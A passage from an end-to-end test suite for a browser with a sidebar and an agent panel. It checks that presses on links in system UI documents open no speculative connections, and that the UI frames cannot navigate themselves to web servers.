    const url = `http://${host("tab-link")}/link?h=${encodeURIComponent(`http://tab-md.${SFX}:15366/`)}`;
    await dispatch(m, { type: "ouvrirOnglet", fenetreId: (await state(m)).fenetres[0]!.id, url, activer: true });
    await expect.poll(() => net.hits.some((h) => h.label === "tab-link"), { timeout: 15_000 }).toBe(true);
    await waitFor(m, `const b = gBrowser.selectedBrowser; return b.currentURI.spec === ${JSON.stringify(url)} && !b.webProgress.isLoadingDocument;`, (v) => v === true, 15_000);
    await sleep(500);
    await m.execute(
      `const r = gBrowser.selectedBrowser.getBoundingClientRect();
       window.synthesizeMouseEvent("mousedown", r.left + r.width / 2, r.top + r.height / 2, { button: 0, clickCount: 1 });
       window.synthesizeMouseEvent("mouseup", r.left + 5, r.top - 5, { button: 0, clickCount: 1 });`,
    );
    await expect.poll(() => tcpSince(tcp0), { timeout: 10_000 }).toBeGreaterThan(0);
    await closeTab("tab-link.", "lien");
  });

  // A pressed link's speculative connect is refused in system UI documents too (the History page's links: a click
  // still opens its tab, history.e2e.ts « ⌘Y lists visited pages; a click reopens one »).
  it("a press on a link of a system document resolves no name and opens no connection", { timeout: 60_000 }, async () => {
    const tcp0 = net.tcp.length;
    const http0 = net.httpConns();
    const hit = await m.execute(
      `return (async () => { const sb = document.getElementById("webaios-sidebar"), d = sb.contentDocument, ui = sb.contentWindow;
       const a = d.createElement("a"); a.id = "sys-md"; a.href = "http://sys-md." + arguments[0] + ":15366/"; a.textContent = "sys sys sys";
       a.style.cssText = "position:fixed;left:20px;top:200px;z-index:2147483647;font-size:20px;background:white";
       d.body.append(a);
       await new Promise((r) => ui.requestAnimationFrame(r));
       const q = a.getBoundingClientRect(), x = q.left + 10, y = q.top + q.height / 2;
       const hit = d.elementFromPoint(x, y)?.id ?? null;
       ui.synthesizeMouseEvent("mousedown", x, y, { button: 0, clickCount: 1 });
       ui.synthesizeMouseEvent("mouseup", 2, 2, { button: 0, clickCount: 1 });
       a.remove();
       return hit; })();`,
      [SFX],
    );
    expect(hit).toBe("sys-md");
    await sleep(3000);
    expect({ names: (await names()).filter((n) => n === "sys-md"), tcp: tcpSince(tcp0), httpConns: net.httpConns() - http0 }).toEqual({ names: [], tcp: 0, httpConns: 0 });
  });

  // Last: a navigation that went through would take the UI away. Their embedder is browser.xhtml: only the frame's mark says they are the UI's.
  it("the sidebar and the agent panel navigating themselves to the web reach no server", { timeout: 60_000 }, async () => {
    // Refused at once (NS_ERROR_CONTENT_BLOCKED, thrown by the setter): what counts is that nothing reaches the server.
    for (const [tag, id] of [["ag", "webaios-agent"], ["sb", "webaios-sidebar"]])
      await m.execute(`try { document.getElementById(arguments[0]).contentWindow.location.href = arguments[1]; } catch (e) {}`, [id, `http://${host(`selfnav-${tag}`)}/selfnav-${tag}`]);
    await sleep(3000);
    expect(net.hits.filter((h) => h.label.startsWith("selfnav-")).map((h) => `${h.label} ${h.path}`)).toEqual([]);
    expect((await names()).filter((n) => n.startsWith("selfnav-"))).toEqual([]);
    expect(await m.execute(`return ["webaios-agent", "webaios-sidebar"].map((id) => document.getElementById(id).contentDocument?.documentURI);`)).toEqual([
      "chrome://browser/content/webaios/agent.html",
      "chrome://browser/content/webaios/sidebar.html",
    ]);
    // Measured: browser.xhtml's CSP (frame-src chrome:) refuses both before the content policy or the observer is asked.
    const csp = (await consoleWith(m, "selfnav-")).join("\n");
    for (const tag of ["ag", "sb"]) expect(csp, tag).toMatch(new RegExp(`Content-Security-Policy.*selfnav-${tag}\\..*frame-src chrome:`));
  });
});
